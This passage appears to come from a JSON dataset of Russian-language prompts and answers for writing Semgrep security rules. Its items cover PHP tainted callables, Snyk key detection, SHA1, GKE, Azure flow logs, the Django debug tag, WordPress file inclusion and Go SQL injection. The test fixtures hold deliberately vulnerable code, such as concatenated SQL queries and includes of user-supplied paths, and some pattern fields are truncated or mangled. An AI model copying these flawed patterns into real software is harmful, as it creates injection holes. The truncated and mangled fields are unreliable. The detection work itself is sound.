...)\n      - pattern-inside: $ZMQDEVICE->setTimerCallback($CALLABLE, ...)\n      - pattern-inside: apcu_entry($KEY, $CALLABLE, ...)\n      - pattern-inside: array_filter($ARRAY, $CALLABLE, ...)\n      - pattern-inside: array_map($CALLABLE, ...)\n      - pattern-inside: array_reduce($ARRAY, $CALLABLE, ...)\n      - pattern-inside: array_walk_recursive($ARRAY, $CALLABLE, ...)\n      - pattern-inside: array_walk($ARRAY, $CALLABLE, ...)\n      - pattern-inside: call_user_func_array($CALLABLE, ...)\n      - pattern-inside: call_user_func($CALLABLE, ...)\n      - pattern-inside: Closure::fromCallable($CALLABLE)\n      - pattern-inside: createCollation($NAME, $CALLABLE)\n      - pattern-inside: eio_grp($CALLABLE, ...)\n      - pattern-inside: eio_nop($PRI, $CALLABLE, ...)\n      - pattern-inside: eio_sync($PRI, $CALLABLE, ...)\n      - pattern-inside: EvPrepare::createStopped($CALLABLE, ...)\n      - pattern-inside: fann_set_callback($ANN, $CALLABLE)\n      - pattern-inside: fdf_enum_values($FDF_DOCUMENT, $CALLABLE, ...)\n      - pattern-inside: forward_static_call_array($CALLABLE, ...)\n      - pattern-inside: forward_static_call($CALLABLE, ...)\n      - pattern-inside: header_register_callback($CALLABLE)\n      - pattern-inside: ibase_set_event_handler($CALLABLE, ...)\n      - pattern-inside: IntlChar::enumCharTypes($CALLABLE)\n      - pattern-inside: iterator_apply($ITERATOR, $CALLABLE)\n      - pattern-inside: ldap_set_rebind_proc($LDAP, $CALLABLE)\n      - pattern-inside: libxml_set_external_entity_loader($CALLABLE, ...)\n      - pattern-inside: new CallbackFilterIterator($ITERATOR, $CALLABLE)\n      - pattern-inside: new EvCheck($CALLABLE, ...)\n      - pattern-inside: new EventHttpRequest($CALLABLE, ...)\n      - pattern-inside: new EvFork($CALLABLE, ...)\n      - pattern-inside: new EvIdle($CALLABLE, ...)\n      - pattern-inside: new Fiber($CALLABLE)\n      - pattern-inside: new Memcached($PERSISTENT_ID, $CALLABLE, ...)\n      - pattern-inside: new RecursiveCallbackFilterIterator($ITERATOR, $CALLABLE)\n      - pattern-inside: new Zookeeper($HOST, $CALLABLE, ...)\n      - pattern-inside: ob_start($CALLABLE, ...)\n      - pattern-inside: oci_register_taf_callback($CONNECTION, $CALLABLE)\n      - pattern-inside: readline_callback_handler_install($PROMPT, $CALLABLE)\n      - pattern-inside: readline_completion_function($CALLABLE)\n      - pattern-inside: register_shutdown_function($CALLABLE, ...)\n      - pattern-inside: register_tick_function($CALLABLE, ...)\n      - pattern-inside: rnp_ffi_set_pass_provider($FFI, $CALLABLE)\n      - pattern-inside: sapi_windows_set_ctrl_handler($CALLABLE, ...)\n      - pattern-inside: set_error_handler($CALLABLE, ...)\n      - pattern-inside: set_exception_handler($CALLABLE)\n      - pattern-inside: setAuthorizer($CALLABLE)\n      - pattern-inside: spl_autoload_register($CALLABLE, ...)\n      - pattern-inside: uasort($ARRAY, $CALLABLE)\n      - pattern-inside: uksort($ARRAY, $CALLABLE)\n      - pattern-inside: usort($ARRAY, $CALLABLE)\n      - pattern-inside: xml_set_character_data_handler($PARSER, $CALLABLE)\n      - pattern-inside: xml_set_default_handler($PARSER, $CALLABLE)\n      - pattern-inside: xml_set_element_handler($PARSER, $CALLABLE, $CALLABLE)\n      - pattern-inside: xml_set_notation_decl_handler($PARSER, $CALLABLE)\n      - pattern-inside: Yar_Concurrent_Client::loop($CALLABLE, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования callable-функций, которые передаются на основе пользовательского ввода. Источники tainted-данных определяются как переменные, полученные через GET, POST, COOKIE, REQUEST и файл php://input. Синки (санкции) обнаруживаются при использовании этих callable-функций внутри различных PHP методов и функций, таких как usort, uksort, array_map и другие. Правило использует pattern-sources и pattern-sinks для идентификации потенциально опасных вызовов.\n\n# Ключевые элементы:\n- ID: tainted-callable\n- Язык: php \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tainted-callable",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: detected-snyk-api-key\nОписание уязвимости: Snyk API Key detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-snyk-api-key.txt\n# ruleid: detected-snyk-api-key\nsnyk_token: 12e45678-12e4-12e4-12e4-12e456789012\n\n# ruleid: detected-snyk-api-key\nAPI_SNYK='12e45678-12e4-12e4-12e4-12e456789012'\n\n# ruleid: detected-snyk-api-key\nsnyktoken=\"12e45678-12e4-12e4-12e4-12e456789012\"\n\n# ruleid: detected-snyk-api-key\nsnyktoken=`12e45678-12e4-12e4-12e4-12e456789012`\n\n# ok: detected-snyk-api-key\n12e4567812e412e412e412e456789012\n\n# ok: detected-snyk-api-key\nother_token: 12e45678-12e4-12e4-12e4-12e456789012  # Ограничиваем длину\n\nОпасные паттерны:\n• snyk_token: 12e45678-12e4-12e4-12e4-12e456789012\n• API_SNYK='12e45678-12e4-12e4-12e4-12e456789012'\n• snyktoken=\"12e45678-12e4-12e4-12e4-12e456789012\"\n\nБезопасные паттерны:  \n• 12e4567812e412e412e412e456789012\n• other_token: 12e45678-12e4-12e4-12e4-12e456789012\n\nЛегенда аннотаций:\n- // ruleid:detected-snyk-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-snyk-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-snyk-api-key\n  pattern-regex: |-\n    (?i)snyk.{0,50}['|\"|`]?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}['\"\\s]?\n  languages: [regex]\n  message: Snyk API Key detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    category: security\n    technology:\n    - secrets\n    - snyk\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, содержащих идентификатор Snyk API в виде GUID формата 'x-x-x-x-x', где x — шестнадцатеричные символы. Регулярное выражение учитывает различные способы записи идентификатора, включая наличие или отсутствие кавычек и пробелов вокруг него. Правило применимо только к текстам на языке regex.\n\n# Ключевые элементы:\n- ID: detected-snyk-api-key\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-snyk-api-key",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: use-of-sha1\nОписание уязвимости: Detected SHA1 hash algorithm which is considered insecure. SHA1 is not collision resistant and is therefore not suitable as a cryptographic signature. Instead, use PBKDF2 for password hashing or SHA256 or SHA512 for other hash function applications.\nCWE: CWE-328: Use of Weak Hash\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-328: Use of Weak Hash\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-of-sha1.java\nimport java.security.MessageDigest;\nimport org.apache.commons.codec.digest.DigestUtils;\n\npublic class Bad {\n  public byte[] bad1(String password) {\n    // ruleid: use-of-sha1\n    MessageDigest sha1Digest = MessageDigest.getInstance(\"SHA-1\");\n    sha1Digest.update(password.getBytes());\n    byte[] hashValue = sha1Digest.digest();\n    return hashValue;\n  }\n\n  public byte[] bad2(String password) {\n    // ruleid: use-of-sha1\n    byte[] hashValue = DigestUtils.getSha1Digest().digest(password.getBytes());\n    return hashValue;\n  }\n\n  public void bad3() {\n    // ruleid: use-of-sha1\n    java.security.MessageDigest md = java.security.MessageDigest.getInstance(\"SHA1\", \"SUN\");\n    byte[] input = { (byte) '?' };\n    Object inputParam = bar;\n    if (inputParam instanceof String)\n      input = ((String) inputParam).getBytes();\n    if (inputParam instanceof java.io.InputStream) {\n      byte[] strInput = new byte[1000];\n      int i = ((java.io.InputStream) inputParam).read(strInput);\n      if (i == -1) {\n        response.getWriter()\n            .println(\n                \"This input source requires a POST, not a GET. Incompatible UI for the InputStream source.\");\n        return;\n      }\n      input = java.util.Arrays.copyOf(strInput, i);\n    }\n    md.update(input);\n    byte[] result = md.digest();\n    java.io.File fileTarget = new java.io.File(\n        new java.io.File(org.owasp.benchmark.helpers.Utils.TESTFILES_DIR),\n        \"passwordFile.txt\");\n    java.io.FileWriter fw = new java.io.FileWriter(fileTarget, true); // the true will append the new data\n    fw.write(\n        \"hash_value=\"\n            + org.owasp.esapi.ESAPI.encoder().encodeForBase64(result, true)\n            + \"\\n\");\n    fw.close();\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• MessageDigest.getInstance(\"SHA-1\");\n• $DU.getSha1Digest().digest(...);\n• java.security.MessageDigest.getInstance(\"SHA1\", \"SUN\")\n\nБезопасные паттерны:  \n• MessageDigest.getInstance(\"SHA-256\");\n• MessageDigest.getInstance(\"SHA-512\");\n• MessageDigest.getInstance(\"PBKDF2WithHmacSHA1\");\n\nЛегенда аннотаций:\n- // ruleid:use-of-sha1: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-of-sha1: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-of-sha1\n  message: >-\n    Detected SHA1 hash algorithm which is considered insecure. SHA1 is not\n    collision resistant and is therefore not suitable as a cryptographic\n    signature. Instead, use PBKDF2 for password hashing\n    or SHA256 or SHA512 for other hash function applications.\n  languages: [java]\n  severity: WARNING\n  metadata:\n    functional-categories:\n      - 'crypto::search::hash-algorithm::javax.crypto'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-328: Use of Weak Hash'\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#WEAK_MESSAGE_DIGEST_SHA1\n    asvs:\n      section: V6 Stored Cryptography Verification Requirements\n      control_id: 6.2.5 Insecure Algorithm\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x14-V6-Cryptography.md#v62-algorithms\n      version: '4'\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: HIGH\n  pattern-either:\n  - patterns:\n    - pattern: |\n        java.security.MessageDigest.getInstance(\"$ALGO\", ...);\n    - metavariable-regex:\n        metavariable: $ALGO\n        regex: (SHA1|SHA-1)\n  - pattern: |\n      $DU.getSha1Digest().digest(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма хеширования SHA-1, который считается небезопасным из-за отсутствия устойчивости к коллизиям. Алгоритм SHA-1 не подходит для криптографических подписей и вместо него рекомендуется использовать PBKDF2 для хэширования паролей или SHA256/SHA512 для других приложений хеш-функций. Правило использует два шаблона: первый ищет вызов метода getInstance класса MessageDigest с аргументом SHA-1 или SHA-1, второй шаблон проверяет метод getSha1Digest из библиотеки Apache Commons Codec.\n\n# Ключевые элементы:\n- ID: use-of-sha1\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-of-sha1",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-gke-binary-authorization\nОписание уязвимости: Ensure use of Binary Authorization\t\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-binary-authorization.tf\n# fail\n# ruleid: gcp-gke-binary-authorization\nresource \"google_container_cluster\" \"fail1\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network    = var.network\n  subnetwork = var.subnetwork\n\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block       = var.ip_allocation_policy[\"cluster_ipv4_cidr_block\"]\n    cluster_secondary_range_name  = var.ip_allocation_policy[\"cluster_secondary_range_name\"]\n    services_ipv4_cidr_block      = var.ip_allocation_policy[\"services_ipv4_cidr_block\"]\n    services_secondary_range_name = var.ip_allocation_policy[\"services_secondary_range_name\"]\n  }\n\n  remove_default_node_pool    = var.remove_default_node_pool\n  enable_binary_authorization = false\n\n  node_config {\n    workload_metadata_config {\n      node_metadata = \"GKE_METADATA_SERVER\"\n    }\n  }\n\n  release_channel {\n    channel = var.release_channel\n  }\n\n  master_auth {\n\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n\n  addons_config {\n    http_load_balancing {\n      disabled = var.http_load_balancing_disabled\n    }\n\n    network_policy_config {\n      disabled = var.network_policy_config_disabled\n    }\n  }\n\n  maintenance_policy {\n    daily_maintenance_window {\n      start_time = var.maintenance_window\n    }\n  }\n\n  private_cluster_config {\n    enable_private_nodes    = var.private_cluster_config[\"enable_private_nodes\"]\n    enable_private_endpoint = var.private_cluster_config[\"enable_private_endpoint\"]\n    master_ipv4_cidr_block  = var.private_cluster_config[\"master_ipv4_cidr_block\"]\n  }\n\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block = var.master_authorized_network_cidr\n    }\n  }\n\n  network_policy {\n    enabled = true\n  }\n\n  pod_security_policy_config {\n    enabled = var.pod_security_policy_config_enabled\n  }\n\n  resource_labels = var.resource_labels\n}\n\n# fail\n# ruleid: gcp-gke-binar  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_container_cluster\" \"fail1\" { ... enable_binary_authorization = false ... }\n• resource \"google_container_cluster\" \"fail2\" { ... enable_binary_authorization = false ... }\n\nБезопасные паттерны:  \n• resource \"google_container_cluster\" \"success\" { ... enable_binary_authorization = true ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-binary-authorization: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-binary-authorization: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-binary-authorization\n  patterns:\n    - pattern: resource\n    - pattern-inside: |\n        resource \"google_container_cluster\" \"...\" {\n        ...\n        }\n    - pattern-not-inside: |\n        resource \"google_container_cluster\" \"...\" {\n        ...\n        enable_binary_authorization = true\n        ...\n        }\n  message: >-\n    Ensure use of Binary Authorization\t\n  metadata:\n    category: best-practice\n    technology:\n      - terraform\n      - gcp\n  languages: [hcl]\n  severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Google Kubernetes Engine (GKE) контейнерных кластеров, которые не используют Binary Authorization. Анализ выполняется путем поиска ресурсов типа 'google_container_cluster' в HCL-коде. Правило проверяет наличие параметра 'enable_binary_authorization', который должен быть установлен в значение 'true'. Если этот параметр отсутствует или имеет другое значение, правило отмечает код как потенциально небезопасный.\n\n# Ключевые элементы:\n- ID: gcp-gke-binary-authorization\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-binary-authorization",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения azure-network-watcher-flowlog-period\nОписание уязвимости: Ensure that Network Security Group Flow Log retention period is 90 days or greater\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-network-watcher-flowlog-period.tf\n# fail\n# ruleid: azure-network-watcher-flowlog-period\nresource \"azurerm_network_watcher_flow_log\" \"test\" {\n  network_watcher_name = azurerm_network_watcher.test.name\n  resource_group_name  = azurerm_resource_group.test.name\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}\n\n# pass\nresource \"azurerm_network_watcher_flow_log\" \"test\" {\n  network_watcher_name = azurerm_network_watcher.test.name\n  resource_group_name  = azurerm_resource_group.test.name\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 90\n  }\n}\n\n# pass\nresource \"azurerm_network_watcher_flow_log\" \"test\" {\n  network_watcher_name = azurerm_network_watcher.test.name\n  resource_group_name  = azurerm_resource_group.test.name\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 0\n  }\n}\n\n# pass\nresource \"azurerm_network_watcher_flow_log\" \"test\" {\n  network_watcher_name = azurerm_network_watcher.test.name\n  resource_group_name  = azurerm_resource_group.test.name\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = \"100\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_network_watcher_flow_log\" \"test\" { \n  ...\n  retention_policy {\n    ...\n    days = 7\n  }\n  ...\n}\n• resource \"azurerm_network_watcher_flow_log\" \"test\" { \n  ...\n  retention_policy {\n    ...\n    days = 50\n  }\n  ...\n}\n\nБезопасные паттерны:  \n• resource \"azurerm_network_watcher_flow_log\" \"test\" { \n  ...\n  retention_policy {\n    ...\n    days = 90\n  }\n  ...\n}\n• resource \"azurerm_network_watcher_flow_log\" \"test\" { \n  ...\n  retention_policy {\n    ...\n    days = 0\n  }\n  ...\n}\n\nЛегенда аннотаций:\n- // ruleid:azure-network-watcher-flowlog-period: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-network-watcher-flowlog-period: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-network-watcher-flowlog-period\n    message: Ensure that Network Security Group Flow Log retention period is 90 days\n      or greater\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_network_watcher_flow_log\" \"...\" {\n          ...\n          retention_policy {\n          ...\n          enabled = true\n          days = $DAYS\n          ...\n          }\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_network_watcher_flow_log\" \"...\" {\n          ...\n          retention_policy {\n          ...\n          enabled = true\n          days = 0\n          ...\n          }\n          ...\n          }\n      - metavariable-comparison:\n          metavariable: $DAYS\n          comparison: $DAYS < 90\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages:\n      - hcl\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Network Watcher Flow Log в конфигурациях Terraform (HCL). Правило проверяет наличие блока retention_policy внутри ресурса azurerm_network_watcher_flow_log и извлекает значение атрибута 'days'. Если значение 'days' меньше 90, то правило считает такую конфигурацию небезопасной. Безопасными считаются конфигурации, где retention period установлен не менее чем на 90 дней или равен нулю (что означает бесконечный период хранения). Также исключаются случаи, когда retention period явно установлен равным нулю.\n\n# Ключевые элементы:\n- ID: azure-network-watcher-flowlog-period\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-network-watcher-flowlog-period",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения debug-template-tag\nОписание уязвимости: Detected a debug template tag in a Django template. This dumps debugging information to the page when debug mode is enabled. Showing debug information to users is dangerous because it may reveal information about your environment that malicious actors can use to gain access to the system. Remove the debug tag.\nCWE: CWE-489: Active Debug Code\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-489: Active Debug Code\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: debug-template-tag.html\n<!DOCTYPE html>\n<html>\n    <head></head>\n    <body>\n        <!-- ruleid: debug-template-tag -->\n        <pre> {% filter force_escape %} {% debug %} {% endfilter %} </pre>\n        <!-- ok: debug-template-tag -->\n        <p>There should be debug information up there. {{ random_debug_variable }}</p>\n    </body>\n</html>  # Ограничиваем длину\n\nОпасные паттерны:\n• <!-- ruleid: debug-template-tag --> <pre> {% filter force_escape %} {% debug %} {% endfilter %} </pre>\n• <!-- ruleid: debug-template-tag --> <div>{% debug %}</div>\n\nБезопасные паттерны:  \n• <!-- ok: debug-template-tag --> <p>There should be debug information up there. {{ random_debug_variable }}</p>\n• <!-- ruleid: not debug-template-tag --> <pre> {% filter force_escape %} {% somethingelse %} {% endfilter %} </pre>\n\nЛегенда аннотаций:\n- // ruleid:debug-template-tag: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:debug-template-tag: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: debug-template-tag\n  languages:\n    - regex\n  severity: WARNING\n  message: >-\n    Detected a debug template tag in a Django template. This dumps\n    debugging information to the page when debug mode is enabled.\n    Showing debug information to users is dangerous because it may\n    reveal information about your environment that malicious actors\n    can use to gain access to the system. Remove the debug tag.\n  pattern-regex: ({% debug %})\n  paths:\n    include:\n      - '*.html'\n  metadata:\n    owasp: 'A06:2017 - Security Misconfiguration'\n    cwe:\n    - 'CWE-489: Active Debug Code'\n    references:\n    - https://docs.djangoproject.com/en/4.2/ref/templates/builtins/#debug\n    - https://stackoverflow.com/questions/2213977/django-debug-display-all-variables-of-a-page\n    category: security\n    technology:\n    - django\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска шаблона '{% debug %}' в HTML-файлах с расширением '.html'. Паттерн ищет точное совпадение с тегом '{% debug %}', который является встроенным тегом отладки в Django templates. Если этот тег присутствует, он может выводить отладочную информацию на страницу при включенном режиме отладки, что представляет угрозу безопасности, так как может раскрыть конфиденциальную информацию о среде выполнения системы.\n\n# Ключевые элементы:\n- ID: debug-template-tag\n- Язык: regex \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "debug-template-tag",
      "language": "regex",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения wp-file-inclusion-audit\nОписание уязвимости: These functions can lead to Local File Inclusion (LFI) or Remote File Inclusion (RFI) if the data inside is user-controlled. Validate the data properly before passing it to these functions.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wp-file-inclusion-audit.php\n<?php\n\n// ruleid: wp-file-inclusion-audit\nrequire $located;\n\n// ruleid: wp-file-inclusion-audit\nrequire_once ABSPATH . 'wp-admin/includes/plugin.php';\n\n// ruleid: wp-file-inclusion-audit\ninclude __DIR__ . '/wp-hooks.php';\n\n// ruleid: wp-file-inclusion-audit\ninclude_once($extension_upload_value);\n\n// ruleid: wp-file-inclusion-audit\n$contents = json_decode( fread( $handle, filesize( $eventInfoFile ) ) );\n\n// ruleid: wp-file-inclusion-audit\n$read_text_ser = fread($open_txt , filesize($import_txt_path));\n\n//ok: wp-file-inclusion-audit\nsome_other_function($args);\n\n\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• require $located;\n• include __DIR__ . '/wp-hooks.php';\n• include_once($extension_upload_value);\n\nБезопасные паттерны:  \n• some_other_function($args);\n• require_once ABSPATH . 'wp-admin/includes/plugin.php';\n\nЛегенда аннотаций:\n- // ruleid:wp-file-inclusion-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:wp-file-inclusion-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: wp-file-inclusion-audit\n    patterns:\n      - pattern-either:\n          - pattern: include(...)\n          - pattern: require(...)\n          - pattern: include_once(...)\n          - pattern: require_once(...)\n          - pattern: fread(...)\n    message: >-\n      These functions can lead to Local File Inclusion (LFI) or Remote File\n      Inclusion (RFI) if the data inside is user-controlled. Validate the data\n      properly before passing it to these functions.\n    paths:\n      include:\n        - \"'**/wp-content/plugins/**/*.php'\"\n    languages:\n      - php\n    severity: WARNING\n    metadata:\n      category: security\n      confidence: LOW\n      likelihood: LOW\n      impact: HIGH\n      subcategory:\n        - audit\n      technology:\n        - Wordpress Plugins\n      references:\n        - https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#file-inclusion\n      owasp:\n        - A01:2021 - Broken Access Control\n        - A08:2021 - Software and Data Integrity Failures\n      cwe:\n        - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n        - \"CWE-73: The software allows user input to control or influence paths of file names that are used in filesystem operations.\"\n        - \"CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей локальной или удаленной файловой инклюзии (LFI/RFI) в PHP-коде WordPress-плагинов. Оно ищет вызовы функций include(), require(), include_once() и require_once(), а также fread(), которые могут принимать пользовательский ввод и потенциально использоваться для выполнения нежелательных файлов. Паттерны используют оператор pattern-either для объединения нескольких вариантов вызовов функций, а ellipsis (...) позволяет учитывать различные варианты написания этих функций.\n\n# Ключевые элементы:\n- ID: wp-file-inclusion-audit\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "wp-file-inclusion-audit",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения string-formatted-query\nОписание уязвимости: String-formatted SQL query detected. This could lead to SQL injection if the string is not sanitized properly. Audit this call to ensure the SQL is not manipulable by external data.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: string-formatted-query.go\npackage main\n\nimport (\n\t\"context\"\n\t\"database/sql\"\n\t\"fmt\"\n\t\"http\"\n\n\t\"github.com/jackc/pgx/v4\"\n)\n\nvar db *sql.DB\nvar postgresDb *pgx.Conn\n\nfunc dbExec(r *http.Request) {\n\tcustomerId := r.URL.Query().Get(\"id\")\n\t// ruleid: string-formatted-query\n\tquery := \"SELECT number, expireDate, cvv FROM creditcards WHERE customerId = \" + customerId\n\n\trow, _ := db.Exec(query)\n\n\t// ok: string-formatted-query\n\tout, err := sshClient.Exec(fmt.Sprintf(\"sudo bash %s\", scriptPath))\n}\n\nfunc okDbExec(r *http.Request) {\n\tcustomerId := r.URL.Query().Get(\"id\")\n\t// ok: string-formatted-query\n\tquery := \"SELECT number, expireDate, cvv FROM creditcards WHERE customerId = customerId\"\n\n\trow, _ := db.Exec(query)\n}\n\nfunc dbQuery1(r *http.Request) {\n    // ruleid: string-formatted-query\n    _, err = db.Query(\"INSERT into users (username, password) VALUES(\" + username + \", \" + password)\n    if err != nil {\n        http.Error(\"mistake\")\n    }\n}\n\nfunc dbQuery2(r *http.Request, username string, password string) {\n    // ruleid: string-formatted-query\n    query = \"INSERT into users (username, password) VALUES(\" + username + \", \" + password\n    _, err = db.QueryRow(query)\n    if err != nil {\n        http.Error(\"mistake\")\n    }\n}\n\nfunc dbQuery3(r *http.Request, username string) {\n    // ruleid: string-formatted-query\n    query = username + \" AND INSERT into users (username, password)\"\n    _, err = db.Exec(query)\n    if err != nil {\n        http.Error(\"mistake\")\n    }\n}\n\nfunc dbQuery4(r *http.Request, username string) {\n    // ruleid: string-formatted-query\n    query := fmt.Sprintf(\"%s AND INSERT into users (username, password)\", username)\n    _, err = db.Exec(query)\n    if err != nil {\n        http.Error(\"mistake\")\n    }\n}\n\nfunc dbQuery5(r *http.Request, username string, password string) {\n\t// ruleid: string-formatted-query\n\tquery := fmt.Sprintf(\"INSERT into users (username, password) VALUES(%s, %s)\", username, password)\n\t_, err = db.QueryRow(query)\n\tif err != nil {\n\t\thttp.Er  # Ограничиваем длину\n\nОпасные паттерны:\n• query := \\\n•  + customerId\n• query := fmt.Sprintf(\\\n\nБезопасные паттерны:  \n• query := \\\n• query := \\\n\nЛегенда аннотаций:\n- // ruleid:string-formatted-query: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:string-formatted-query: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
